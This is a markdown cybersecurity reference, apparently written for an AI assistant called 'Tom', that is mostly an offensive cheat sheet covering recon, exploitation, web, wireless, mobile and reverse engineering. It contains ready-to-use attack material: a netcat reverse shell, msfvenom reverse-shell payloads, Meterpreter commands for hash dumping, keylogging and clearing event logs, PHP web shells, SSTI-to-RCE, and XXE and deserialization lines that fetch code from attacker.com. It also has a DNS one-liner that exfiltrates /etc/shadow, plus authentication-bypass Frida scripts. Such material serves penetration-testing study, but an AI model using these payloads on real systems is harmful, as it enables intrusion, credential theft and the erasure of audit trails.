# Cybersecurity Master Knowledge Base

> **Purpose:** Comprehensive reference for Tom � an AI assistant tasked with understanding all hacking and cybersecurity disciplines for ethical, educational, and defensive purposes.
> **Scope:** Every major domain, tool, technique, and methodology in modern cybersecurity.
> **Mandate:** This knowledge is for authorized testing, CTFs, bug bounties, defense, and education. Never for illegal activity.

---


## Table of Contents

1. [Foundations](#1-foundations)
2. [Ethical Hacking Methodology](#2-ethical-hacking-methodology)
3. [Web Application Security](#3-web-application-security)
4. [Network Penetration Testing](#4-network-penetration-testing)
5. [Wireless & IoT Hacking](#5-wireless--iot-hacking)
6. [Mobile Security](#6-mobile-security)
7. [Reverse Engineering](#7-reverse-engineering)
8. [Malware Analysis](#8-malware-analysis)
9. [Social Engineering](#9-social-engineering)
10. [Cloud Security](#10-cloud-security)
11. [Tools Reference](#11-tools-reference)
12. [Python for Hacking](#12-python-for-hacking)
13. [Defensive Security](#13-defensive-security)
14. [Certifications Roadmap](#14-certifications-roadmap)

---

## 1. Foundations

### 1.1 Networking Basics

#### OSI Model (7 Layers)

| Layer | Name | PDU | Examples | Key Protocols |
|-------|------|-----|----------|---------------|
| 7 | Application | Data | HTTP, FTP, SMTP, DNS | Application data |
| 6 | Presentation | Data | SSL/TLS, JPEG, ASCII | Encryption, encoding |
| 5 | Session | Data | NetBIOS, RPC | Session management |
| 4 | Transport | Segment/Datagram | TCP, UDP | Ports, reliability |
| 3 | Network | Packet | IP, ICMP, ARP | Routing, addressing |
| 2 | Data Link | Frame | Ethernet, PPP | MAC, switching |
| 1 | Physical | Bit | 1000BASE-T, 802.11 | Raw transmission |

#### TCP/IP Model (4 Layers)
- **Application** (HTTP, DNS, SSH, FTP, SMTP)
- **Transport** (TCP, UDP)
- **Internet** (IP, ICMP, IGMP)
- **Link** (Ethernet, ARP, WiFi)

#### TCP Three-Way Handshake
1. Client sends SYN (seq=x) to Server
2. Server responds SYN/ACK (seq=y, ack=x+1)
3. Client sends ACK (seq=x+1, ack=y+1)
4. Connection established

#### Key Port Numbers

| Port | Protocol | Service |
|------|----------|---------|
| 20/21 | TCP | FTP |
| 22 | TCP | SSH |
| 23 | TCP | Telnet |
| 25 | TCP | SMTP |
| 53 | TCP/UDP | DNS |
| 80 | TCP | HTTP |
| 88 | TCP/UDP | Kerberos |
| 110 | TCP | POP3 |
| 135 | TCP | RPC |
| 137-139 | TCP/UDP | NetBIOS |
| 143 | TCP | IMAP |
| 161/162 | UDP | SNMP |
| 389 | TCP/UDP | LDAP |
| 443 | TCP | HTTPS |
| 445 | TCP | SMB |
| 636 | TCP | LDAPS |
| 993 | TCP | IMAPS |
| 995 | TCP | POP3S |
| 1433 | TCP | MSSQL |
| 1521 | TCP | Oracle DB |
| 2049 | TCP/UDP | NFS |
| 3306 | TCP | MySQL |
| 3389 | TCP | RDP |
| 5432 | TCP | PostgreSQL |
| 5900 | TCP | VNC |
| 5985/5986 | TCP | WinRM |
| 6379 | TCP | Redis |
| 8080 | TCP | HTTP-Alt |
| 8443 | TCP | HTTPS-Alt |
| 27017 | TCP | MongoDB |

### 1.3 Operating System Security


## 2. Ethical Hacking Methodology

### 2.1 Reconnaissance

#### Passive Reconnaissance

**WHOIS Lookups:**
whois example.com
whois 192.168.1.1

**DNS Enumeration:**
nslookup example.com
dig example.com ANY
dig axfr @ns1.example.com example.com

**Google Dorking (GHDB):**
- intitle:"index of" "wp-content"
- inurl:"phpMyAdmin" "Welcome to phpMyAdmin"
- filetype:env "DB_PASSWORD"
- inurl:"/cgi-bin/" filetype:sh

**Certificate Transparency:**
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq .

**Shodan:**
shodan search "port:3389 country:US"
shodan search "org:"Example Corp""

**theHarvester:**
theHarvester -d example.com -b google,linkedin,bing

**Recon-ng:**
recon-ng
use recon/domains-hosts/builtwith
set source example.com
run

**OSINT Resources:**
- osintframework.com
- inteltechniques.com
- haveibeenpwned.com
- shodan.io
- crt.sh

#### Active Reconnaissance

**Network Scanning (nmap):**
nmap -sn 192.168.1.0/24
nmap -sT -sV -O 192.168.1.100
nmap -p- -sV 192.168.1.100
nmap -A 192.168.1.100
nmap --script vuln 192.168.1.100
nmap -sS -Pn -D RND:10 -f --mtu 24 192.168.1.100
nmap -sU --top-ports 20 192.168.1.100

**Masscan:**
masscan -p80 192.168.0.0/16 --rate=1000

**Netcat:**
nc -nv 192.168.1.100 80
nc -lvnp 4444
nc -lvnp 4444 < file.txt
nc -nv 192.168.1.100 4444 -e /bin/bash

### 2.2 Scanning & Enumeration

**HTTP (80,443):**
curl -I http://example.com
nikto -h http://example.com
whatweb http://example.com

**SMB (445):**
smbclient -L //192.168.1.100 -N
smbmap -H 192.168.1.100
enum4linux -a 192.168.1.100

**SNMP (161):**
snmpwalk -c public -v2c 192.168.1.100
snmp-check 192.168.1.100 -c public
onesixtyone -c community.txt -i targets.txt

**LDAP (389/636):**
ldapsearch -x -h 192.168.1.100 -b "dc=example,dc=com"

**SMTP (25):**
nc -nv 192.168.1.100 25
VRFY root
EXPN root
smtp-user-enum -M VRFY -U users.txt -t 192.168.1.100

**MySQL (3306):**
mysql -h 192.168.1.100 -u root -p

**MSSQL (1433):**
nmap --script ms-sql-info,ms-sql-empty-password -p 1433 192.168.1.100

**RDP (3389):**
nmap --script rdp-enum-encryption,rdp-ntlm-info -p 3389 192.168.1.100

### 2.3 Vulnerability Assessment

**Nessus:**
nessuscli scan new --name "Scan1" --target 192.168.1.0/24 --template "basic"

**OpenVAS/Greenbone:**
gvm-start
gvm-cli --gmp-username admin --gmp-password pass --xml "<create_target><name>T</name><hosts>192.168.1.0/24</hosts></create_target>"

**Nikto:**
nikto -h http://example.com -ssl -port 443
nikto -h http://example.com -evasion 1 -Format html -output report.html

**Vuln Scanners:**
nmap --script smb-vuln-ms17-010 -p 445 192.168.1.0/24
nmap --script rdp-vuln-ms12-020 -p 3389 192.168.1.0/24

### 2.4 Exploitation

**Metasploit Framework:**
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.100
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.50
check
exploit

**Meterpreter Post-Exploitation Commands:**
getuid - Current user
sysinfo - System information
hashdump - Dump password hashes
download /etc/shadow
upload backdoor.exe C:\Windows\Temp
shell - Drop to OS shell
ps - List processes
migrate PID - Move to another process
keyscan_start - Start keylogging
keyscan_dump - Dump keystrokes
screenshot - Take screenshot
clearev - Clear event logs
load kiwi - Load Mimikatz
creds_all - Dump all credentials

**msfvenom (Payload Generator):**
msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell.elf
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o shell.exe
msfvenom -p php/reverse_php LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.php
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.jsp
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f psh -o shell.ps1
msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -o shell.apk
msfvenom -p python/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw -o shell.py

**Searchsploit:**
searchsploit apache 2.4
searchsploit -x exploits/linux/webapps/46676.py

### 2.5 Post-Exploitation

#### Linux Privilege Escalation

**Commands:**
sudo -l
find / -perm -4000 -type f 2>/dev/null
getcap -r / 2>/dev/null
cat /etc/crontab
uname -a
find / -writable -type f 2>/dev/null
mount -l
find / -name "docker.sock" 2>/dev/null

**PE Automation:**
wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
./linpeas.sh


---

## 3. Web Application Security

### 3.1 OWASP Top 10 (2021)

#### A01: Broken Access Control

**IDOR (Insecure Direct Object Reference):**
https://example.com/profile?id=1234
Change to: https://example.com/profile?id=1235

for i in {1000..2000}; do curl -s "https://example.com/profile?id=$i" | grep -q "Welcome" && echo "User $i found"; done

**Path Traversal:**
https://example.com/download?file=../../etc/passwd
https://example.com/download?file=..%2f..%2f..%2fwindows%2fsystem32%2fconfig%2fSAM
..;/..;/..;/etc/passwd
..%252f..%252f..%252fetc/passwd (double URL encoding)

#### A03: Injection

**SQL Injection (SQLi):**

**In-Band (Error-based):**
' OR 1=1 --
' OR '1'='1
admin' --
1' ORDER BY 3 --
1' UNION SELECT 1,2,3 --
1' UNION SELECT @@version,user(),database() --

**Blind (Boolean-based):**
' AND 1=1 -- (true page)
' AND 1=2 -- (false page)
' AND SUBSTRING((SELECT password FROM users WHERE id=1),1,1)='a' --

**Blind (Time-based):**
' AND SLEEP(5) --
' AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a',SLEEP(5),0) --

**SQLMap Automated Exploitation:**
sqlmap -u "https://example.com/page?id=1"
sqlmap -u "https://example.com/login" --data="username=admin&password=test"
sqlmap -u "https://example.com/page?id=1" --os-shell
sqlmap -u "https://example.com/page?id=1" --dump
sqlmap -u "https://example.com/page?id=1" --dbs
sqlmap -u "https://example.com/page?id=1" -D database_name --tables
sqlmap -u "https://example.com/page?id=1" --tamper=space2comment --random-agent

**NoSQL Injection (MongoDB):**
{"username": "admin", "password": {"$ne": ""}}
/?search=admin' && this.password[0]=='a' && '1'=='1

#### A05: Security Misconfiguration

**Detection:**
curl -s http://example.com/uploads/ | grep "Index of"
curl -s http://example.com/.env
curl -s http://example.com/.git/config
curl -s http://example.com/page?id='

#### A07: Identification and Authentication Failures

**Brute Force (Hydra):**
hydra -l admin -P /usr/share/wordlists/rockyou.txt example.com http-post-form "/login:username=^USER^&password=^PASS^:Invalid"
hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.100

**Brute Force (Medusa):**
medusa -h example.com -u admin -P /usr/share/wordlists/rockyou.txt -M web-form -m FORM:/login -m DENY-SIGNAL:"Invalid"

#### A10: Server-Side Request Forgery (SSRF)

**Basic SSRF:**
https://example.com/fetch?url=http://169.254.169.254/latest/meta-data/   (AWS)
https://example.com/fetch?url=http://metadata.google.internal/           (GCP)
https://example.com/fetch?url=file:///etc/passwd                        (File read)
https://example.com/fetch?url=dict://localhost:6379/info                (Redis)

**Blind SSRF Detection:**
curl -X POST https://example.com/fetch --data "url=http://YOUR-BURP-COLLABORATOR.oastify.com"

### 3.2 API Security

**REST API Testing:**
gobuster dir -u https://api.example.com -w /usr/share/wordlists/api/endpoints.txt
curl -X PUT https://api.example.com/users/123 --data '{"role":"admin","is_admin":true}'
curl -H "X-Forwarded-For: 10.0.0.1" https://api.example.com/login
curl -X OPTIONS https://api.example.com/resource -v

**GraphQL Security:**
curl -X POST https://api.example.com/graphql -H "Content-Type: application/json" -d '{"query":"query { __schema { types { name fields { name } } } }"}'
inql -u https://example.com/graphql -t "Authorization: Bearer TOKEN"

**JWT Attacks:**
jwt_tool eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWRtaW4ifQ.signature
jwt_tool -X a -t "https://example.com/api/protected" -rh "Authorization: Bearer TOKEN"
jwt_tool -T -I -u "role:admin" TOKEN
hashcat -m 16500 jwt.txt /usr/share/wordlists/rockyou.txt

### 3.3 Authentication Bypass

**Type Juggling (PHP):**
"admin" == 0 -> true (PHP type juggling)
"0e462097431907" == "0e830400451993" -> true (both treated as 0)

### 3.4 File Upload Vulnerabilities

**Bypass Techniques:**
shell.php shell.php3 shell.php5 shell.phtml shell.php.jpg
shell.php%00.jpg (null byte)
shell.asp;.jpg (semicolon truncation)
Content-Type: image/jpeg (MIME bypass)
GIF89a<?php system($_GET['cmd']); ?> (magic byte header)

**Web Shells:**
<?php system($_GET['cmd']); ?>
<?php exec($_POST['cmd'],$out); print_r($out); ?>

### 3.5 Server-Side Template Injection (SSTI)

**Detection:**
{{7*7}} -> 49 confirms SSTI
${7*7} (JSP/FreeMarker)
{{config}} (Jinja2/Flask)
{% import os %}{{ os.popen('id').read() }}

**Jinja2 SSTI to RCE:**
{{ config.__class__.__init__.__globals__['os'].popen('id').read() }}

### 3.6 XML External Entities (XXE)

**Basic XXE:**
<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root>&xxe;</root>

**Blind XXE (OOB):**
<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/xxe.dtd"> %xxe;]>

**XXE to SSRF:**
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">

### 3.7 Insecure Deserialization

**PHP Object Injection:**
phpggc Laravel/RCE1 system 'id'
phpggc Symfony/RCE4 exec 'id'

**Java Deserialization (ysoserial):**
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/shell.sh | bash'

**Python Pickle:**
import pickle, os
class RCE(object):
    def __reduce__(self):
        return (os.system, ('id',))
print(pickle.dumps(RCE()).hex())



---

## 4. Network Penetration Testing

### 4.1 ARP Spoofing & MITM

**ARP Spoofing with arpspoof (dsniff):**
echo 1 > /proc/sys/net/ipv4/ip_forward
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100
# All traffic now flows through attacker

**ARP Spoofing with Bettercap:**
sudo bettercap -iface eth0
net.probe on
net.show
set arp.spoof.targets 192.168.1.100
arp.spoof on
net.sniff on
https.proxy on
set https.proxy.sslstrip true

**MITM with Ettercap:**
ettercap -T -M arp:remote -i eth0 /192.168.1.1// /192.168.1.100//

**HTTPS Stripping:**
mitmproxy --mode transparent --listen-port 8080

### 4.2 DNS Spoofing & Tunneling

**DNS Spoofing:**
ettercap -T -M arp:remote -P dns_spoof /192.168.1.1// /192.168.1.100//

**DNS Tunneling (iodine):**
# Server (attacker)
iodined -f -c -P password 10.0.0.1 tunnel.example.com
# Client (inside network)
iodine -f -P password tunnel.example.com

**DNS Exfiltration:**
cat /etc/shadow | base64 -w0 | while read line; do dig $line.attacker.com; done
# Receive: tcpdump -i eth0 port 53 -A

### 4.3 VLAN Hopping

**Switch Spoofing (DTP abuse):**
# Configure interface as trunk to access all VLANs
yersinia dtp -attack 1

**Double Tagging (802.1Q):**
# Frame with two VLAN tags -> outer stripped, inner reveals target VLAN

### 4.4 Wireless Hacking

**Monitor Mode Setup:**
airmon-ng start wlan0
airmon-ng check kill
iwconfig wlan0mon

**WPA2 Cracking:**
airodump-ng wlan0mon
airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
aireplay-ng -0 5 -a AA:BB:CC:DD:EE:FF -c CLIENT_MAC wlan0mon
aircrack-ng -w /usr/share/wordlists/rockyou.txt capture-01.cap

**WPA2 with Hashcat (GPU):**
cap2hccapx capture-01.cap capture.hccapx
hashcat -m 2500 capture.hccapx /usr/share/wordlists/rockyou.txt --force

# New format (PMKID)
hcxpcapngtool capture-01.cap -o capture.hc22000
hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt

**WPA3 (SAE) Analysis:**
# Dragonblood vulnerabilities: downgrade, side-channel, timing
# WPA3 cracking is ~1000x slower than WPA2
hcxdumptool -i wlan0mon -o capture.pcapng --enable_status=1
hashcat -m 22001 capture.hc22001 /usr/share/wordlists/rockyou.txt

**Evil Twin Attack:**
airbase-ng -e "Free WiFi" -c 6 wlan0mon
# Bettercap approach:
sudo bettercap -eval "set wifi.ap.ssid 'Free WiFi'; set wifi.ap.channel 6; wifi.ap on"

**Deauthentication Attack:**
aireplay-ng -0 5 -a AP_MAC -c CLIENT_MAC wlan0mon
aireplay-ng -0 0 -a AP_MAC wlan0mon  # Deauth all clients
mdk4 wlan0mon d -B AP_MAC

**WPS Attack:**
wash -i wlan0mon  # Scan for WPS enabled APs
reaver -i wlan0mon -b AP_MAC -c 6 -K 1 -N -vv  # Pixie dust
reaver -i wlan0mon -b AP_MAC -c 6 -vv  # Online brute force

### 4.5 Bluetooth Exploitation

**Classic Bluetooth:**
hcitool scan
hcitool info XX:XX:XX:XX:XX:XX
sdptool browse XX:XX:XX:XX:XX:XX

**BLE (Bluetooth Low Energy):**
hcitool lescan
gatttool -b XX:XX:XX:XX:XX:XX -I
> connect
> primary
> characteristics
> char-read-uuid UUID

**BlueZ Attacks:**
bluetoothctl
scan on
devices
pair XX:XX:XX:XX:XX:XX

**Known Bluetooth Vulns:**
- BlueBorne (CVE-2017-0781-0785) — RCE via Bluetooth
- BlueSnarf — Download files without auth
- BlueBugging — AT command injection
- KNOB (CVE-2019-9506) — Key negotiation downgrade
- BLURtooth (CVE-2020-15802) — Cross-transport downgrade

### 4.6 NFC/RFID Hacking

**Tools:**
mfoc -O dump.mfd  # Read Mifare Classic
nfc-list
nfc-mfclassic r a dump.mfd  # Read
nfc-mfclassic w a dump.mfd  # Write cloned tag

**Proxmark3:**
lf search  # Find LF tag
hf mf info  # Mifare info
hf mf chk  # Check default keys
hf mf mfkey32  # Nested auth attack
hf mf ck  # Crack keys
hf mf wrbl  # Write block
hf mf sim  # Simulate tag

### 4.7 SNMP Exploitation

snmpwalk -c public -v2c 192.168.1.100
snmpwalk -c private -v2c 192.168.1.100
onesixtyone -c community.txt -i targets.txt
snmpset -c private -v2c 192.168.1.100 1.3.6.1.2.1.1.5.0 s "Hacked-Device"

# Enumerate Windows via SNMP:
snmpwalk -c public -v2c 192.168.1.100 1.3.6.1.4.1.77.1.2.25  # Users
snmpwalk -c public -v2c 192.168.1.100 1.3.6.1.2.1.25.4.2.1.2  # Processes
snmpwalk -c public -v2c 192.168.1.100 1.3.6.1.2.1.25.6.3.1.2  # Software

### 4.8 DHCP Starvation & Rogue DHCP

**DHCP Starvation:**
yersinia dhcp -attack 2
dhcpstarv -i eth0
msf > use auxiliary/dhcp/dhcp_starvation

**Rogue DHCP Server:**
dnsmasq --interface=eth0 --dhcp-range=192.168.1.100,192.168.1.200,255.255.255.0,1h \
  --dhcp-option=3,192.168.1.50 --dhcp-option=6,192.168.1.50 --no-resolv



---

## 5. Wireless & IoT Hacking

### 5.1 Aircrack-ng Suite

airmon-ng start wlan0
airodump-ng wlan0mon
airodump-ng -c 6 --bssid AP_MAC -w capture wlan0mon

aireplay-ng -9 wlan0mon  # Injection test
aireplay-ng -1 0 -e "SSID" -a AP_MAC -h MY_MAC wlan0mon  # Fake auth (WEP)
aireplay-ng -3 -b AP_MAC -h CLIENT_MAC wlan0mon  # ARP replay (WEP)
aireplay-ng -4 -b AP_MAC -h CLIENT_MAC wlan0mon  # KoreK chopchop (WEP)
aireplay-ng -5 -b AP_MAC -h MY_MAC wlan0mon  # Fragmentation (WEP)

aircrack-ng -b AP_MAC capture-01.cap
aircrack-ng -z capture-01.cap  # PTW attack (fast WEP)

airdecap-ng -e SSID -p password capture-01.cap  # Decrypt WPA capture

### 5.2 Hashcat Modes for WiFi
# 2500 = WPA/WPA2 PMK
# 22000 = WPA-PBKDF2-PMKID+EAPOL
# 16800 = WPA-PMKID-PBKDF2 (old)
# 16100 = WPA3 (SAE-PK)
# 22001 = WPA3-PMKID

hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt --force
hashcat -m 22000 capture.hc22000 /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule

### 5.3 WiFi Reconnaissance

airodump-ng wlan0mon -w scan_output
kismet -c wlan0mon
# WiGLE.net — Wardriving database

### 5.4 Zigbee Hacking

# KillerBee framework
zbid  # Identify devices
zbwireshark  # Capture traffic
zbstumbler  # Wardrive
zbdump -w capture.pcap -c 11  # Dump channel 11

# Attacks: sniff network key, replay, DoS

### 5.5 RFID Cloning

# Low Frequency (125 kHz) — EM4102
nfc-list
nfc-emulate 4102
# Proxmark3:
lf search
lf em 4102 read
lf em 4102 write --id 1A2B3C4D
lf em 4102 sim --id 1A2B3C4D

# High Frequency (13.56 MHz) — Mifare Classic
hf mf info
hf mf dumper f dump.mfd
hf mf restore f dump.mfd
hf mf sim *

### 5.6 SDR (Software Defined Radio)

**Tools:**
gqrx  # Spectrum analyzer
rtl_test -t  # Test SDR device
rtl_sdr capture.bin -f 433000000 -s 2048000  # Capture 433 MHz
rtl_fm -f 433000000 -M wbfm -s 200000 -r 48000 - | aplay -r 48k -f S16_LE
urh  # Universal Radio Hacker (signal analysis)
inspectrum  # Visual spectrum analyzer
gnuradio-companion  # Signal processing blocks

**Keyless Entry:**
rtl_sampler -f 433920000 -s 2500000 -n 50000000 -o captures/car_key.bin
# Rolljam: jam first code, capture second (two SDRs needed)

**ADS-B (Aircraft):**
dump1090 --interactive --net
rtl_adsb

### 5.7 IoT Firmware Analysis & Exploitation

**Firmware Extraction:**
binwalk firmware.bin
binwalk -Me firmware.bin  # Extract
unsquashfs _firmware.extracted/squashfs-root
./extract-firmware.sh firmware.bin  # FMK

**Firmware Analysis:**
strings firmware.bin | grep -i "password\|user\|admin\|secret\|key"
grep -r "password" squashfs-root/
grep -r "PRIVATE KEY" squashfs-root/
find squashfs-root -name "*.key" -o -name "*.cert" -o -name "*.pem"
cat squashfs-root/etc/shadow
cat squashfs-root/etc/inittab

**IoT Exploitation Vectors:**
1. Default credentials
2. No auth on serial/UART
3. Command injection (ping, traceroute)
4. Buffer overflows in HTTP handlers
5. Insecure firmware updates (no signature)
6. Hardcoded backdoors
7. Debug interfaces exposed

**Hardware Hacking:**
screen /dev/ttyUSB0 115200  # UART connection
openocd -f interface/jlink.cfg -f target/stm32f4x.cfg  # JTAG
flashrom -p ft2232_spi:type=2232H -r firmware_dump.bin  # SPI flash



---

## 6. Mobile Security

### 6.1 Android APK Analysis

**APK Decompilation:**
apktool d app.apk -o app_decompiled
apktool b app_decompiled -o patched.apk
apksigner sign --ks my.keystore patched.apk

jadx app.apk -d app_source
jadx-gui app.apk

d2j-dex2jar app.apk -o app.jar  # Then open in JD-GUI

**Manifest Analysis:**
aapt dump badging app.apk
aapt dump permissions app.apk
# Check for: exported activities, debuggable, backup, permissions

**Common Android Vulnerabilities:**
- Insecure data storage (SharedPreferences, SQLite, internal files)
- No SSL pinning (MITM possible)
- HTTP instead of HTTPS
- WebView with JS enabled and file:// access
- Intent spoofing/interception
- addJavascriptInterface with sensitive methods

**Android Dynamic Analysis:**
adb shell settings put global http_proxy 192.168.1.50:8080
adb push burp-ca.crt /sdcard/

# Frida SSL bypass
frida -U -l ssl_bypass.js -f com.example.app --no-pause

# Objection
objection -g com.example.app explore
> android sslpinning disable

# Dump app data
adb backup -f app_backup.ab com.example.app
dd if=app_backup.ab bs=1 skip=24 | openssl zlib -d > app_backup.tar

**Frida Scripts for Android:**
// SSL pinning bypass
Java.perform(function() {
    var TrustManager = Java.use("javax.net.ssl.X509TrustManager");
    TrustManager.checkClientTrusted.implementation = function() {};
    TrustManager.checkServerTrusted.implementation = function() {};
});

// Password bypass
Java.perform(function() {
    var MainActivity = Java.use("com.example.app.MainActivity");
    MainActivity.checkPassword.implementation = function(password) {
        return true;
    };
});

### 6.2 iOS Security Analysis

**iOS Binary Decryption:**
clutch -d com.example.app
# Or use frida-ios-dump
iproxy 2222 22
ssh root@localhost -p 2222
frida-ios-dump com.example.app

**Binary Analysis:**
unzip app.ipa
class-dump -H Payload/App.app/App -o headers/
otool -l Payload/App.app/App | grep -A 4 LC_ENCRYPTION_INFO
otool -Iv Payload/App.app/App | grep -i "stack_chk\|canary\|pie"
strings Payload/App.app/App | grep "http://\|NSURLConnection\|Keychain"

**iOS Runtime Analysis (jailbroken):**
frida -U com.example.app
objection -g com.example.app explore
> ios info binary
> ios keychain dump
> ios nsuserdefaults get
> ios cookies get
> ios pasteboard monitor

**Common iOS Vulnerabilities:**
- Insecure Keychain storage
- No SSL pinning
- Plist files with plaintext
- Pasteboard containing sensitive data
- Snapshot/state preservation leaks
- Insecure URL schemes

### 6.3 Root/Jailbreak Detection Bypass

**Android Root Bypass (Frida):**
Java.perform(function() {
    var RootBeer = Java.use("com.scottyab.rootbeer.RootBeer");
    RootBeer.isRooted.implementation = function() { return false; };
    var Runtime = Java.use("java.lang.Runtime");
    Runtime.exec.overload("[Ljava.lang.String;").implementation = function(cmd) {
        if (cmd.join(" ").indexOf("su") !== -1) return null;
        return this.exec(cmd);
    };
});

**iOS Jailbreak Bypass (Frida):**
// Bypass Cydia URL scheme check
var UIApplication = ObjC.classes.UIApplication;
var canOpenURL = UIApplication['- canOpenURL:'];
canOpenURL.implementation = function(self, sel, url) {
    var str = url.absoluteString().toString();
    if (str.indexOf("cydia://") !== -1) return 0;
    return canOpenURL(self, sel, url);
};

### 6.4 Insecure Data Storage

**Android:**
adb shell cat /data/data/com.example.app/shared_prefs/LoginPrefs.xml
adb shell sqlite3 /data/data/com.example.app/databases/app.db
adb shell ls -la /data/data/com.example.app/files/
adb shell ls /sdcard/Android/data/com.example.app/

**iOS:**
objection -g com.example.app explore
> ios keychain dump
> ios nsuserdefaults get



---

## 7. Reverse Engineering

### 7.1 PE/ELF Analysis

**PE (Windows Executable) Structure:**
DOS Header (MZ) -> PE Signature -> COFF Header -> Optional Header -> Section Table -> Sections
.text (code), .data (data), .rdata (read-only), .idata (imports), .edata (exports), .reloc (relocations), .rsrc (resources)

**PE Analysis:**
python3 -c "
import pefile
pe = pefile.PE('file.exe')
print('Entry:', hex(pe.OPTIONAL_HEADER.AddressOfEntryPoint))
print('ImageBase:', hex(pe.OPTIONAL_HEADER.ImageBase))
for sec in pe.sections:
    print(sec.Name.decode(), hex(sec.VirtualAddress), sec.SizeOfRawData)
for entry in pe.DIRECTORY_ENTRY_IMPORT:
    print(entry.dll.decode())
    for imp in entry.imports:
        print(' ', imp.name.decode() if imp.name else 'ordinal', hex(imp.address))
"

# Check ASLR, DEP, CFG
dh = pe.OPTIONAL_HEADER.DllCharacteristics
print('ASLR:', bool(dh & 0x40))
print('DEP:', bool(dh & 0x100))
print('CFG:', bool(dh & 0x4000))

**ELF (Linux Executable) Structure:**
ELF Header -> Program Headers (segments) -> Section Headers
.text, .rodata, .data, .bss, .plt, .got, .dynsym, .strtab, .symtab

**ELF Analysis:**
readelf -h file.elf
readelf -l file.elf  # Program headers
readelf -S file.elf  # Section headers
readelf -s file.elf  # Symbol table
objdump -d file.elf  # Disassemble
objdump -t file.elf  # Symbols
nm file.elf           # List symbols
nm -C file.elf        # Demangle C++
strings file.elf     # Extract strings
strings -n 8 file.elf

**Packer Detection & Unpacking:**
file file.exe
# Common packers: UPX, Themida, VMProtect, Enigma, MPress, ASPack
upx -d packed.exe  # UPX unpack

# Generic unpacking: Set breakpoint at OEP, dump memory, fix IAT with Scylla

### 7.2 Disassemblers

**IDA Pro:**
# IDA Python scripting
import idautils, idc
for func_ea in idautils.Functions():
    print(idc.GetFunctionName(func_ea), hex(func_ea))
idc.PatchByte(0x401000, 0x90)  # NOP instruction
idc.MakeName(0x401000, "my_func")

**Ghidra (NSA):**
# Free decompiler with Python/Java scripting
# Headless mode: analyzeHeadless /path autoScript -postScript AnalyzeScript.java

**Radare2:**
r2 -A file.elf
aaaa  # Full analysis
afl   # List functions
pdf @ main  # Print disassembly of main
izz   # List all strings
VV @ main  # Graph mode
wa nop  # Patch with NOP
axt 0x401000  # Cross references to address

# Cutter — GUI for radare2
cutter file.exe

### 7.3 Debuggers

**x64dbg (Windows):**
Key Features: Graph view, plugins, anti-anti-debug, memory map
Plugins: Scylla (import reconstructor), xAnalyzer, OllyDumpEx, StrongOD

**GDB (Linux):**
gdb ./program
(gdb) run arg1
(gdb) break main
(gdb) break *0x401000
(gdb) info registers
(gdb) x/10i $rip  # Disassemble 10 instructions
(gdb) x/10gx $rsp  # Examine stack
(gdb) x/s 0x400000  # String at address
(gdb) set $rax = 0
(gdb) continue
(gdb) stepi
(gdb) nexti

**WinDbg (Windows Kernel Debugger):**
windbg ./program.exe
0:000> lm        # List modules
0:000> bp main   # Breakpoint
0:000> g         # Go
0:000> t         # Step into
0:000> r         # Registers
0:000> k         # Stack trace
0:000> !analyze -v  # Crash analysis

### 7.4 Anti-Debugging & Anti-VM

**Anti-Debugging (Windows):**
if (IsDebuggerPresent()) exit(1);
CheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged);

# PEB NtGlobalFlag
mov eax, fs:[30h]   ; PEB
mov eax, [eax+68h]  ; NtGlobalFlag
test eax, 0x70
jne debugger_detected

# Timing check (rdtsc)
__asm { rdtsc; mov start, eax; /* code */ rdtsc; sub eax, start; cmp eax, threshold; jg debugger }

# Hardware breakpoint detection
GetThreadContext(GetCurrentThread(), &ctx);
if (ctx.Dr0 || ctx.Dr1 || ctx.Dr2 || ctx.Dr3) { /* breakpoints detected */ }

**Anti-Debugging (Linux):**
if (ptrace(PTRACE_TRACEME, 0, 1, 0) < 0) { /* being traced */ }

# /proc/self/status TracerPid check
if (tracer_pid != 0) { /* debugger attached */ }

**Anti-VM Techniques:**
- Check registry for VM artifacts (VMware, VirtualBox, VBOX strings)
- VMware backdoor I/O port detection (in eax, dx with magic value)
- Check MAC address OUI (08:00:27 = VirtualBox)
- Check CPU cores (<2 = suspicious), RAM (<2GB)
- Check for VM processes (vmtoolsd.exe, VBoxTray.exe)
- Check /proc/cpuinfo for hypervisor flag

### 7.5 Decompilers

- Hex-Rays (IDA Pro plugin) — Commercial, best quality
- Ghidra — Free, good quality, multiple architectures
- RetDec — Open source, produces C and LLVM IR
  retdec-decompiler.py file.exe
- Boomerang — Open source C decompiler



---

## 8. Malware Analysis

### 8.1 Static Analysis

**Basic Static Analysis:**
file malware.exe
md5sum malware.exe
sha256sum malware.exe

# Strings analysis
strings malware.exe | head -100
strings -n 8 malware.exe | grep -i "http\|https\|\.com\|\.onion\|encrypt\|decrypt\|C2\|command"
strings -e l malware.exe  # Unicode strings

